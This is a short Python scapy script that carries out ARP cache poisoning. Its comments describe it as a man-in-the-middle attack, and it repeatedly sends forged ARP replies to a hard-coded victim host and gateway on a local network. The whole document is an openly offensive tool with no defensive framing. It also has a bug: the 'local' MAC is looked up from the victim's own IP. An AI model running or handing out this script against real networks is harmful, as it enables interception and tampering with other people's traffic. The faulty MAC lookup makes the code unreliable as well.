#!/usr/bin/env python

from scapy.all import *
import time
import sys
import signal

def ctrl_handler(signum, frame):
	print "Exiting..."
	sys.exit(0)

def arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC):
	#In order to perform Man-in-the-Middle two arp messages will be sent
	#whith the is-at opcode. One towards the victim client which tells it who is the 
	#Gateway and the other towards the Gateway which tells it who is the client.
	
	# Send the packet to the Client Target (Victim). 
	victimARP = Ether(dst = victimMAC, src = targetMAC)/ARP(op = 2, hwsrc = localMAC, psrc = targetIP)

	#Send the ARP Response to the Gateway.
	targetARP = Ether(dst = targetMAC, src = victimMAC)/ARP(op = 2, hwsrc = localMAC, psrc = victimIP)

	print "\nForwarding target: %s to  MAC %s"%(targetIP, localMAC)
	print "Forwarding target: %s to MAC %s"%(victimIP, localMAC)

	#Keep sending the ARP Packets for ever every 30 seconds
	while True:
		sendp(victimARP, verbose = 0, inter = 1)
		sendp(targetARP, verbose = 0, inter = 1)
		time.sleep(30)


victimIP = "192.168.2.3"
targetIP = "192.168.2.1"

victimMAC = getmacbyip(victimIP)
targetMAC = getmacbyip(targetIP)
localMAC = getmacbyip("192.168.2.3")

signal.signal(signal.SIGINT, ctrl_handler)

arpPoison(victimIP, targetIP, victimMAC, targetMAC, localMAC)
